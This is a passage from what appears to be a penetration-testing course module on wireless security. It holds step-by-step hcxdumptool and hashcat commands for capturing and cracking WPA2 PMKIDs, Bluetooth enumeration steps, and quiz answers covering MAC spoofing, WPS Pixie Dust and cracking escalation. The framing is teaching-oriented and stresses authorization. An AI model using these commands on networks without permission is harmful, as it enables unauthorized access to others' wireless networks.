sudo hcxdumptool -i wlan0mon -o pmkid_exercise.pcapng \
  --filterlist_ap=/tmp/target.txt --filtermode=2
# Wait 1-3 minutes. Watch for PMKID messages in the output.
# Press Ctrl+C to stop

# Step 4: Convert to hashcat format
hcxpcapngtool -o pmkid_exercise.hc22000 pmkid_exercise.pcapng
# Check if PMKIDs were captured:
# Look for "PMKID (best)...: 1" in the output

# Step 5: If PMKID was captured, attempt cracking
hashcat -m 22000 pmkid_exercise.hc22000 /usr/share/wordlists/rockyou.txt
# Or with aircrack-ng if hashcat is not available

# Note: Not all APs support PMKID. If your AP doesn't provide one,
# try a different router model. This is expected behavior.

# Step 6: Clean up
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

**Expected Outcome**: You understand the PMKID attack methodology. If your AP provides a PMKID, you capture it without needing any connected clients or deauthentication. If your AP does not provide a PMKID, you learn that this attack is hardware-dependent.

---

### Exercise 5: Scan for Bluetooth Devices

**Objective**: Discover and enumerate Bluetooth devices in your environment.

**Setup**: Bluetooth adapter (built-in or USB). Your own Bluetooth devices for testing (phone, headphones, smart watch).

```bash
# Step 1: Check Bluetooth adapter status
hciconfig -a
# If down:
sudo hciconfig hci0 up

# Step 2: Classic Bluetooth discovery
hcitool scan
# Note all discovered devices — these should be YOUR devices

# Step 3: Service enumeration on your own device
sdptool browse [YOUR_PHONE_BT_ADDRESS]
# Observe the available services and protocols

# Step 4: BLE scan
sudo hcitool lescan
# Note BLE devices (fitness trackers, beacons, IoT devices)
# Press Ctrl+C after 30 seconds

# Step 5: Use bluetoothctl for detailed information
bluetoothctl
# power on
# scan on
# (wait 30 seconds)
# scan off
# info [YOUR_DEVICE_ADDRESS]
# exit

# Step 6: BLE GATT enumeration (on your own BLE device)
gatttool -b [YOUR_BLE_DEVICE] -I
# connect
# primary
# characteristics
# char-read-hnd 0x0003
# disconnect
# exit

# Step 7: Document findings
# List all discovered devices, their types, services, and BLE characteristics
```

**Expected Outcome**: You can discover Classic Bluetooth and BLE devices, enumerate their services and characteristics, and understand the Bluetooth attack surface. You recognize that many devices are discoverable and expose service information to anyone in range.

---

## Knowledge Check

Test your understanding of wireless security concepts.

**Question 1**: What three non-overlapping channels are used in the 2.4 GHz band?

<details>
<summary>Answer</summary>
Channels <strong>1, 6, and 11</strong>. Each 2.4 GHz channel is 22 MHz wide, and with the band spanning 2.400-2.4835 GHz, only these three channels have enough separation to avoid overlapping. Using overlapping channels causes co-channel interference, degrading performance for all nearby networks.
</details>

**Question 2**: Why is WEP fundamentally insecure regardless of key length?

<details>
<summary>Answer</summary>
WEP uses a <strong>24-bit Initialization Vector (IV)</strong> prepended to the static key before RC4 encryption. With only 16.7 million possible IV values, IVs inevitably repeat on active networks (within hours). When two packets share the same IV, XORing the ciphertexts cancels the keystream, revealing plaintext relationships. Additionally, certain "weak IVs" (discovered by Fluhrer, Mantin, and Shamir) leak information about the key bytes. The PTW attack can recover the full key with as few as 20,000-40,000 packets, typically in minutes. Key length (64-bit or 128-bit) does not address these structural weaknesses.
</details>

**Question 3**: Explain the purpose of each message in the WPA2 4-way handshake.

<details>
<summary>Answer</summary>
<ul>
<li><strong>Message 1</strong>: AP sends its random nonce (ANonce) to the client. The client now has both nonces and can derive the PTK.</li>
<li><strong>Message 2</strong>: Client sends its random nonce (SNonce) plus a MIC (Message Integrity Code) to the AP. The MIC proves the client knows the PMK. The AP can now derive the same PTK and verify the MIC.</li>
<li><strong>Message 3</strong>: AP sends the GTK (Group Temporal Key, for broadcast/multicast traffic) encrypted with the KEK portion of the PTK, plus another MIC. This confirms the AP also knows the PMK.</li>
<li><strong>Message 4</strong>: Client sends an acknowledgment. Both sides install the keys and begin encrypted communication.</li>
</ul>
The handshake derives per-session encryption keys (PTK) without ever transmitting the password. An attacker who captures the handshake can attempt offline dictionary attacks by guessing passwords and computing the expected MIC.
</details>

**Question 4**: What is the PMKID attack and why is it considered stealthier than traditional handshake capture?

<details>
<summary>Answer</summary>
The PMKID attack, discovered in 2018, captures the <strong>PMKID (Pairwise Master Key Identifier)</strong> from the first EAPOL frame that an AP sends during the 4-way handshake. The PMKID is calculated as <code>HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_Client)</code>. It is stealthier because:
<ul>
<li>It only requires the attacker to <strong>initiate an association</strong> with the AP and capture the first message</li>
<li><strong>No connected clients are needed</strong> — works against an AP with zero active clients</li>
<li><strong>No deauthentication</strong> is sent — no existing connections are disrupted</li>
<li>The attack requires only a single frame, minimizing time and radio footprint</li>
</ul>
However, not all APs include the PMKID in Message 1 — it depends on the vendor and firmware. The captured PMKID can be cracked offline using hashcat (mode 22000).
</details>

**Question 5**: How does WPA3-SAE (Simultaneous Authentication of Equals) improve upon WPA2-PSK?

<details>
<summary>Answer</summary>
WPA3-SAE replaces the PSK 4-way handshake with the <strong>Dragonfly key exchange</strong>, providing several improvements:
<ul>
<li><strong>Forward secrecy</strong>: Each session derives unique keys. Even if the password is later compromised, previously captured traffic cannot be decrypted.</li>
<li><strong>Resistance to offline dictionary attacks</strong>: SAE is a zero-knowledge proof protocol. Each password guess requires an active exchange with the AP, making offline cracking impossible. An attacker cannot capture a handshake and crack it later at GPU speed.</li>
<li><strong>Equal authentication</strong>: Both the client and AP prove knowledge of the password simultaneously, unlike PSK where the AP is trusted implicitly.</li>
<li><strong>Mandatory PMF (802.11w)</strong>: Management frames are protected, preventing deauthentication attacks.</li>
<li><strong>Natural protection against weak passwords</strong>: Even a weak password benefits from SAE's resistance to offline attacks (though strong passwords are still recommended).</li>
</ul>
</details>

**Question 6**: Why does MAC address filtering provide no real security on a wireless network?

<details>
<summary>Answer</summary>
MAC address filtering is trivially bypassed because:
<ul>
<li><strong>MAC addresses are transmitted in cleartext</strong> in every wireless frame, even in encrypted networks. An attacker running airodump-ng can see all allowed MAC addresses in the station list.</li>
<li><strong>MAC addresses are easily spoofed</strong>: <code>sudo macchanger -m [allowed_MAC] wlan0</code> changes the attacker's MAC in seconds.</li>
<li>The attacker simply observes which MACs are connected, waits for one to disconnect (or deauths it), and then uses that MAC address to connect.</li>
<li>MAC filtering adds management overhead (maintaining allowlists) while providing zero cryptographic security.</li>
</ul>
MAC filtering is considered "security through obscurity" and should never be relied upon as a security control. Use proper authentication (WPA3-SAE or 802.1X) instead.
</details>

**Question 7**: What is an Evil Twin attack and what defenses are effective against it?

<details>
<summary>Answer</summary>
An <strong>Evil Twin</strong> is a rogue access point configured with the same SSID as a legitimate network, typically with stronger signal strength to attract clients. The attacker may deauthenticate clients from the real AP to force reconnection to the Evil Twin. Once connected, the attacker can intercept traffic, present fake captive portals, or perform man-in-the-middle attacks.

Effective defenses include:
<ul>
<li><strong>WPA3 with PMF</strong>: Prevents deauthentication attacks that drive clients to the Evil Twin</li>
<li><strong>802.1X with EAP-TLS</strong>: Mutual certificate authentication — the client verifies the RADIUS server's certificate, rejecting rogue servers</li>
<li><strong>WIDS/WIPS</strong>: Detects rogue APs and can automatically contain them</li>
<li><strong>VPN</strong>: Encrypts all traffic even if connected to a malicious AP</li>
<li><strong>HSTS</strong>: Prevents SSL stripping on HTTPS sites</li>
<li><strong>User training</strong>: Educate users to verify network legitimacy and avoid entering credentials on unexpected portal pages</li>
</ul>
</details>

**Question 8**: What is the WPS PIN vulnerability and how does the Pixie Dust attack differ from brute force?

<details>
<summary>Answer</summary>
The WPS PIN vulnerability stems from a design flaw in how the 8-digit PIN is validated:
<ul>
<li>The PIN is checked in <strong>two halves</strong>: the first 4 digits and the last 3 digits (the 8th digit is a checksum)</li>
<li>This reduces the keyspace from 100 million to just <strong>11,000 combinations</strong> (10,000 + 1,000)</li>
<li>Online brute force (Reaver/Bully) tries each PIN sequentially — takes ~3-11 hours without lockout</li>
</ul>

The <strong>Pixie Dust attack</strong> is fundamentally different:
<ul>
<li>It exploits <strong>weak random number generation</strong> in certain chipsets (Ralink, Broadcom, Realtek)</li>
<li>Instead of guessing PINs, it <strong>calculates the correct PIN</strong> from the cryptographic nonces (E-S1, E-S2) used in a single WPS exchange</li>
<li>Completes in <strong>seconds</strong> instead of hours</li>
<li>Bypasses WPS lockout since it only needs one exchange</li>
<li>Not all chipsets are vulnerable — depends on the quality of the RNG implementation</li>
</ul>
</details>

**Question 9**: Describe the differences between Classic Bluetooth and BLE from a security perspective.

<details>
<summary>Answer</summary>
<strong>Classic Bluetooth (BR/EDR)</strong>:
<ul>
<li>Uses <strong>frequency-hopping</strong> across 79 channels at 1600 hops/second — harder to sniff without specialized hardware (Ubertooth)</li>
<li>Pairing uses <strong>Secure Simple Pairing (SSP)</strong> with ECDH key exchange (Bluetooth 2.1+)</li>
<li>Vulnerable to <strong>KNOB attack</strong> (key entropy reduction)</li>
<li>Service discovery (SDP) can reveal detailed device capabilities</li>
<li>Connection-oriented, always-on profiles (audio, file transfer)</li>
</ul>

<strong>Bluetooth Low Energy (BLE)</strong>:
<ul>
<li>Uses only <strong>3 advertisement channels</strong> (37, 38, 39) — easier to monitor</li>
<li>Many devices use <strong>"Just Works" pairing</strong> with no authentication (zero PIN)</li>
<li>Data exposed via <strong>GATT services and characteristics</strong> — often readable without authentication</li>
<li>Many IoT devices transmit <strong>sensitive data in cleartext</strong> over BLE</li>
<li>BLE 4.0-4.1 had weak legacy pairing; BLE 4.2+ added LE Secure Connections (ECDH)</li>
<li>Static keys and lack of key rotation common in cheap IoT devices</li>
<li>Sniffable with inexpensive hardware (nRF52840 dongle, ~$10)</li>
</ul>

BLE generally presents a <strong>larger attack surface</strong> in modern environments because of widespread IoT adoption, manufacturer security shortcuts, and easier sniffing. Classic Bluetooth is harder to intercept but has its own protocol-level vulnerabilities.
</details>

**Question 10**: You are conducting an authorized wireless penetration test. You capture a WPA2 handshake but your dictionary attack with `rockyou.txt` fails. What are your next steps?

<details>
<summary>Answer</summary>
When a basic dictionary attack fails, escalate with these techniques:

<ol>
<li><strong>Rule-based attacks</strong>: Apply hashcat rules to the wordlist:
<code>hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule</code>
Rules add common mutations (capitalize, append numbers, leet speak, reverse) — multiplies effective wordlist size by 50-100x.</li>

<li><strong>Targeted wordlist generation</strong>:
<ul>
<li>Use <code>cewl</code> to scrape the organization's website for relevant terms</li>
<li>Include company name, location, products, employee names</li>
<li>Add common patterns: <code>CompanyName2024!</code>, <code>WiFi@Office</code>, <code>Summer2025</code></li>
</ul></li>

<li><strong>Hybrid attacks</strong>: Combine dictionary words with brute-force masks:
<code>hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d?d?d</code>
(word + 4 digits)</li>

<li><strong>Larger wordlists</strong>: Use <code>weakpass</code>, <code>CrackStation</code>, or language-specific lists</li>

<li><strong>PMKID capture</strong>: Try the clientless PMKID approach if not already attempted</li>

<li><strong>Cloud GPU cracking</strong>: Rent AWS p3/p4 or Google Cloud GPU instances for dramatically higher throughput</li>

<li><strong>Try WPS</strong>: Check if WPS is enabled with <code>wash</code>. If so, attempt Pixie Dust then brute force</li>

<li><strong>Social engineering</strong>: If in scope, phishing or pretexting to obtain the password</li>

<li><strong>Report findings</strong>: A password that resists extensive cracking is actually a positive finding. Document the cracking attempts, time invested, and wordlists used. Note that the password appears strong, but recommend WPA3-SAE to eliminate offline cracking entirely.</li>
</ol>
</details>

---

## Summary

Wireless security is a critical domain in penetration testing. Key takeaways from this module:

- **WEP is dead** — crackable in minutes, never use it
- **WPA2-PSK is vulnerable** to offline dictionary attacks if the handshake is captured; use strong passphrases (15+ characters)
- **WPA3-SAE eliminates offline attacks** through the Dragonfly handshake and provides forward secrecy
- **WPS is a persistent backdoor** — disable it on all access points
- **Monitor mode and packet injection** require specific USB WiFi adapters with compatible chipsets
- **PMKID attacks** are stealthier than traditional handshake capture — no client deauth needed
- **Evil Twin attacks** exploit user trust in familiar SSIDs — defend with 802.1X and PMF
- **Bluetooth (especially BLE)** is an often-overlooked attack surface in IoT environments
- **Defense in depth**: WPA3 + strong passwords + disabled WPS + PMF + 802.1X + WIDS/WIPS + network segmentation

{: .warning }
> Always ensure you have **explicit written authorization** before performing any wireless security testing. Document your scope, methods, and findings thoroughly. Wireless attacks affect not just the target but potentially all users on the network and nearby networks.

---

[Previous Module: Network Attacks](09-network-attacks.html){: .btn .btn-outline }
[Next Module: Web Application Security](11-web-application-security.html){: .btn .btn-primary }
